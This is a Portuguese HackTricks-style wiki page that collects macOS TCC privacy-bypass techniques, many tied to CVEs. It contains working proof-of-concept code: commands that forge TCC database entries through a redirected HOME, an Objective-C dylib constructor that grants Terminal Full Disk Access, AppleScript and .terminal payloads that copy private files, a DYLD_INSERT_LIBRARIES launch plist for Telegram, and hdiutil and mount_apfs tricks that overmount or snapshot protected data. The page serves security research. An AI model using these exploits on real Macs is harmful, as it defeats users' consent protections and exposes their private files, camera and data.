# Bypasses do TCC no macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Por funcionalidade

### Write Bypass

Isto não é um bypass, é apenas assim que o TCC funciona: **ele não oferece proteção contra gravação**. Se o Terminal **não tiver acesso para ler a Área de Trabalho de um usuário, ainda poderá gravar nela**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
O **extended attribute `com.apple.macl`** é adicionado ao novo **file** para dar ao **creators app** acesso para lê-lo.

### TCC ClickJacking

É possível **colocar uma janela sobre o prompt do TCC** para fazer o usuário **aceitá-lo** sem perceber. Você pode encontrar uma PoC em [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

O atacante pode **criar apps com qualquer nome** (por exemplo, Finder, Google Chrome...) no **`Info.plist`** e fazê-los solicitar acesso a algum local protegido pelo TCC. O usuário pensará que o aplicativo legítimo é o responsável por solicitar esse acesso.\
Além disso, é possível **remover o app legítimo do Dock e colocar o falso em seu lugar**; assim, quando o usuário clicar no falso (que pode usar o mesmo ícone), ele poderá chamar o legítimo, solicitar permissões do TCC e executar um malware, fazendo o usuário acreditar que o app legítimo solicitou o acesso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Mais informações e PoC em:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Por padrão, um acesso via **SSH costumava ter "Full Disk Access"**. Para desabilitar isso, é necessário que ele esteja listado, mas desabilitado (removê-lo da lista não removerá esses privilégios):

![TCC Request by arbitrary name - SSH Bypass: Por padrão, um acesso via SSH costumava ter "Full Disk Access". Para desabilitar isso, é necessário que ele esteja listado, mas desabilitado (removê-lo...](<../../../../../images/image (1077).png>)

Aqui você pode encontrar exemplos de como alguns **malwares conseguiram contornar essa proteção**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Observe que agora, para poder habilitar o SSH, é necessário ter **Full Disk Access**

### Handle extensions - CVE-2022-26767

O atributo **`com.apple.macl`** é concedido aos files para dar a um **determinado aplicativo permissão para lê-lo.** Esse atributo é definido quando um file é **arrastado e solto** sobre um app ou quando um usuário **clica duas vezes** em um file para abri-lo com o **aplicativo padrão**.

Assim, um usuário poderia **registrar um app malicioso** para lidar com todas as extensões e chamar o Launch Services para **abrir** qualquer file (portanto, o file malicioso receberá acesso para lê-lo).

### iCloud

Com o entitlement **`com.apple.private.icloud-account-access`**, é possível se comunicar com o **`com.apple.iCloudHelper`** XPC service, que **fornecerá tokens do iCloud**.

O **iMovie** e o **Garageband** tinham esse entitlement e outros que permitiam isso.

Para obter mais **informações** sobre o exploit para **obter tokens do iCloud** a partir desse entitlement, consulte a palestra: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Um app com a permissão **`kTCCServiceAppleEvents`** poderá **controlar outros Apps**. Isso significa que ele poderá **abusar das permissões concedidas aos outros Apps**.

Para mais informações sobre Apple Scripts, consulte:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Por exemplo, se um App tiver **permissão de Automation sobre o `iTerm`**, neste exemplo **`Terminal`** tem acesso ao iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

O Terminal, que não tem FDA, pode chamar o iTerm, que tem essa permissão, e usá-lo para realizar ações:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Através do Finder

Ou, se um App tiver acesso ao Finder, ele poderia executar um script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Por comportamento do App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

O **tccd daemon** de **userland** usava a variável de ambiente **`HOME`** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

De acordo com [esta publicação no Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), e como o TCC daemon é executado pelo **`launchd`** dentro do domínio do usuário atual, é possível **controlar todas as variáveis de ambiente** passadas a ele.\
Assim, um **atacante poderia definir a variável de ambiente `$HOME`** no **`launchctl`** para apontar para um **diretório** **controlado**, **reiniciar** o daemon do **TCC** e, então, **modificar diretamente o banco de dados do TCC** para conceder a si mesmo **todos os entitlements do TCC disponíveis**, sem que o usuário final fosse solicitado em nenhum momento.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes tinha acesso a locais protegidos pelo TCC, mas quando uma nota é criada, ela é **criada em um local não protegido**. Portanto, era possível pedir ao Notes para copiar um arquivo protegido para uma nota (ou seja, para um local não protegido) e então acessar o arquivo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

O binário `/usr/libexec/lsd`, com a biblioteca `libsecurity_translocate`, possuía o entitlement `com.apple.private.nullfs_allow`, que permitia criar mounts **nullfs**, e possuía o entitlement `com.apple.private.tcc.allow` com **`kTCCServiceSystemPolicyAllFiles`** para acessar todos os arquivos.

Era possível adicionar o atributo de quarentena a "Library", chamar o serviço XPC **`com.apple.security.translocation`**, e então ele mapeava Library para **`$TMPDIR/AppTranslocation/d/d/Library`**, onde todos os documentos dentro de Library podiam ser **acessados**.

### CVE-2024-44131 - FileProvider symlink race

Apps que delegam operações de arquivo a um **privileged helper** (neste caso, **`fileproviderd`** / **`Files.app`**) copiam ou movem itens **em nome do usuário**, portanto a cópia é executada com os privilégios do helper, e não com os do caller.

A Jamf Threat Labs mostrou que a validação de symlink realizada antes da operação pode sofrer **race**: em vez de criar o symlink no **último** componente do path (que é verificado), o atacante troca um diretório **intermediário** do path **depois que a cópia já começou**. O privileged helper então segue o link controlado pelo atacante e lê/grava locais protegidos pelo TCC **sem nunca exibir um prompt**.

Diretórios que **não** são protegidos por um UUID aleatório em seu path (por exemplo, `~/Library/Mobile Documents/com~apple~CloudDocs`) são os alvos mais fáceis, pois o atacante pode prever o path completo para realizar o race.

> [!TIP]
> Este é o padrão genérico a ser procurado: **qualquer processo privilegiado que resolva um path mais de uma vez** (check-then-use ou `rename()`/`copyfile()` resolvendo source e destination separadamente) pode sofrer race se um diretório no meio do path for trocado. Apenas `O_NOFOLLOW_ANY`, `openat()` em um diretório já aberto por meio de um FD, ou `realpath()` + revalidação realmente fecham essa janela.

Mais informações no [**writeup da Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).

### SQLITE_SQLLOG_DIR

`libsqlite3` pode ser compilada com `SQLITE_ENABLE_SQLLOG`, que adiciona um hook de logging controlado por variáveis de ambiente ([`test_sqllog.c` upstream](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):

- **`SQLITE_SQLLOG_DIR=path`** – para **cada database aberto**, uma **cópia do arquivo de database** e um log das instruções SQL são gravados em `path` (o diretório já deve existir).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – cria uma **nova cópia sempre que** um DB é aberto/anexado, em vez de reutilizar uma.
- **`SQLITE_SQLLOG_CONDITIONAL`** – registra uma conexão apenas se existir um arquivo `<database>-sqllog` ao lado do DB principal.

Se for possível injetar essa variável em um processo que possua **FDA** e abra databases SQLite, ele copiará tranquilamente esses databases protegidos para um diretório controlado por você. Como o nome do arquivo de destino é derivado de dados controlados pelo atacante, um **symlink criado no destino** transforma a mesma primitiva em uma **arbitrary file write** com os privilégios do processo-alvo.

### **SQLITE_AUTO_TRACE**

Se a variável de ambiente **`SQLITE_AUTO_TRACE`** estiver definida, a biblioteca **`libsqlite3.dylib`** começará a fazer **logging** de todas as queries SQL. Muitos aplicativos utilizavam essa biblioteca, portanto era possível registrar todas as suas queries SQLite.

Vários aplicativos da Apple utilizavam essa biblioteca para acessar informações protegidas pelo TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Procurando gravações de arquivos orientadas por env-var

As duas entradas anteriores são instâncias da mesma técnica genérica, e vale a pena procurar mais casos: **frameworks carregados em apps privilegiados pelo TCC frequentemente expõem variáveis de ambiente de debug/logging que fazem o processo criar um arquivo em um caminho controlado pelo caller**.

Workflow para encontrá-las:

1. Escolha um target com FDA ou outra permissão TCC interessante (`Music`, `TV`, `Terminal`, agentes MDM...) e liste os frameworks aos quais ele faz link (`otool -L`, `vmmap`).
2. Faça grep nesses frameworks procurando strings de `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Defina as variáveis candidatas via `launchctl setenv NAME /path/you/control`, inicie o app e observe o que ele faz no filesystem com `fs_usage -w -f filesys <pid>` ou `sudo fs_usage | grep <path>`.
4. Se o processo **criar ou renomear** um arquivo no seu diretório, você terá uma write primitive: aponte o destino para um symlink (ou faça uma race em um diretório intermediário, como no CVE-2024-44131 acima) para redirecioná-lo para `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Duas coisas limitam isso. Primeiro, as variáveis **`DYLD_*`** são ignoradas por binários com hardened runtime, a menos que o app inclua o entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("um valor Booleano que indica se o app pode ser afetado por variáveis de ambiente do dynamic linker, que você pode usar para injetar código no processo do app") — veja também [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Segundo, a Apple remove variáveis individuais de debug dos frameworks assim que elas são reportadas, então uma variável que funcionou em uma versão do macOS frequentemente desaparece na seguinte. Se um app se recusar silenciosamente a iniciar depois que você definir uma variável, trate essa variável como já filtrada.

Veja [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) para o truque equivalente com variáveis do linker.

### Apple Remote Desktop

Como root, você poderia habilitar esse serviço, e o **ARD agent teria full disk access**, que poderia então ser abusado por um usuário para fazê-lo copiar um novo **TCC user database**.

## Por **NFSHomeDirectory**

O TCC usa um banco de dados na pasta HOME do usuário para controlar o acesso a recursos específicos do usuário em **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Portanto, se o usuário conseguir reiniciar o TCC com uma variável de ambiente $HOME apontando para uma **pasta diferente**, ele poderá criar um novo banco de dados TCC em **/Library/Application Support/com.apple.TCC/TCC.db** e enganar o TCC para conceder qualquer permissão TCC a qualquer app.

> [!TIP]
> Observe que a Apple usa a configuração armazenada no perfil do usuário, no atributo **`NFSHomeDirectory`**, como **valor de `$HOME`**. Portanto, se você comprometer um app com permissões para modificar esse valor (**`kTCCServiceSystemPolicySysAdminFiles`**), poderá **weaponize** essa opção com um TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

O **primeiro POC** usa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar a pasta **HOME** do usuário.

1. Obtenha um blob _csreq_ para o app alvo.
2. Plante um arquivo _TCC.db_ falso com o acesso necessário e o blob _csreq_.
3. Exporte a entrada do usuário no Directory Services com [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifique a entrada do Directory Services para alterar o diretório home do usuário.
5. Importe a entrada modificada do Directory Services com [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Pare o _tccd_ do usuário e reinicie o processo.

O segundo POC usava **`/usr/libexec/configd`**, que tinha `com.apple.private.tcc.allow` com o valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era possível executar o **`configd`** com a opção **`-t`**, e um attacker poderia especificar um **Bundle customizado para carregar**. Portanto, o exploit **substitui** o método de alteração do diretório home do usuário via **`dsexport`** e **`dsimport`** por uma **code injection no `configd`**.

Para mais informações, consulte o [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Por process injection

Existem diferentes técnicas para injetar código dentro de um processo e abusar de seus privilégios TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Além disso, o process injection mais comum encontrado para realizar TCC bypass é por meio de **plugins (load library)**.\
Plugins são códigos adicionais, geralmente na forma de libraries ou plist, que serão **carregados pelo aplicativo principal** e executados sob o contexto dele. Portanto, se o aplicativo principal tivesse acesso a arquivos restritos pelo TCC (por meio de permissões concedidas ou entitlements), o **código customizado também teria esse acesso**.

### CVE-2020-27937 - Directory Utility

O aplicativo `/System/Library/CoreServices/Applications/Directory Utility.app` tinha o entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, carregava plugins com a extensão **`.daplug`** e **não tinha hardened** runtime.

Para weaponize este CVE, o **`NFSHomeDirectory`** é **alterado** (abusando do entitlement anterior) para poder **assumir o controle do banco de dados TCC dos usuários** e realizar TCC bypass.

Para mais informações, consulte o [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

O binário **`/usr/sbin/coreaudiod`** tinha os entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. O primeiro **permitia code injection**, e o segundo concedia acesso para **gerenciar o TCC**.

Esse binário permitia carregar **third party plug-ins** da pasta `/Library/Audio/Plug-Ins/HAL`. Portanto, era possível **carregar um plugin e abusar das permissões TCC** com este POC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-Ins da Device Abstraction Layer (DAL)

Aplicativos do sistema que abrem o stream da câmera via Core Media I/O (aplicativos com **`kTCCServiceCamera`**) carregam **no processo estes plugins** localizados em `/Library/CoreMediaIO/Plug-Ins/DAL` (não restrito pelo SIP).

Basta armazenar nessa pasta uma library com o **constructor** comum para **injetar código**.

Vários aplicativos da Apple eram vulneráveis a isso.

### Firefox

O aplicativo Firefox tinha os entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para mais informações sobre como explorar isso facilmente, [**consulte o relatório original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

O binário `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tinha os entitlements **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, que permitiam injetar código no processo e usar os privilégios do TCC.

### CVE-2023-26818 - Telegram

O Telegram tinha os entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, portanto era possível abusar dele para **obter acesso às suas permissões**, como gravar usando a câmera. Você pode [**encontrar o payload no writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Observe como, para usar a variável de ambiente e carregar uma library, um **plist personalizado** foi criado para injetar essa library, e o **`launchctl`** foi usado para iniciá-la:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Por invocações de open

É possível invocar **`open`** mesmo em um ambiente sandboxed

### Scripts de Terminal

É bastante comum conceder **Full Disk Access (FDA)** ao Terminal, pelo menos em computadores usados por profissionais de tecnologia. E é possível invocar scripts **`.terminal`** usando-o.

Scripts **`.terminal`** são arquivos plist como este, com o comando a ser executado na chave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Um aplicativo poderia escrever um script de terminal em um local como /tmp e iniciá-lo com um comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Por montagem

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Qualquer usuário** (até mesmo os não privilegiados) pode criar e montar um snapshot do Time Machine e **acessar TODOS os arquivos** desse snapshot.\
O **único privilégio** necessário é que o aplicativo usado (como o `Terminal`) tenha acesso ao **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que precisa ser concedido por um administrador.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Uma explicação mais detalhada pode ser [**encontrada no relatório original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount sobre o arquivo TCC

Mesmo que o arquivo do TCC DB esteja protegido, era possível **montar sobre o diretório** um novo arquivo TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Confira o **full exploit** no [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Conforme explicado no [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), este CVE explorava o `diskarbitrationd`.

A função `DADiskMountWithArgumentsCommon` do framework público `DiskArbitration` realizava as verificações de segurança. No entanto, era possível ignorá-las chamando diretamente o `diskarbitrationd` e, assim, usar elementos `../` no caminho e symlinks.

Isso permitia que um atacante fizesse mounts arbitrários em qualquer local, inclusive sobre o banco de dados do TCC, devido ao entitlement `com.apple.private.security.storage-exempt.heritable` do `diskarbitrationd`.

### asr

A ferramenta **`/usr/sbin/asr`** permitia copiar o disco inteiro e montá-lo em outro local, ignorando as proteções do TCC.

### Location Services

Existe um terceiro banco de dados do TCC em **`/var/db/locationd/clients.plist`** para indicar os clientes autorizados a **acessar os serviços de localização**.\
A pasta **`/var/db/locationd/` não era protegida contra o mounting de DMGs**, portanto era possível montar nosso próprio plist.

## Por aplicativos de inicialização


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Por grep

Em várias ocasiões, os arquivos armazenam informações sensíveis, como e-mails, números de telefone, mensagens... em locais não protegidos (o que é considerado uma vulnerabilidade pela Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Isso não funciona mais, mas [**funcionava no passado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Outra forma usando [**eventos do CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referência

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
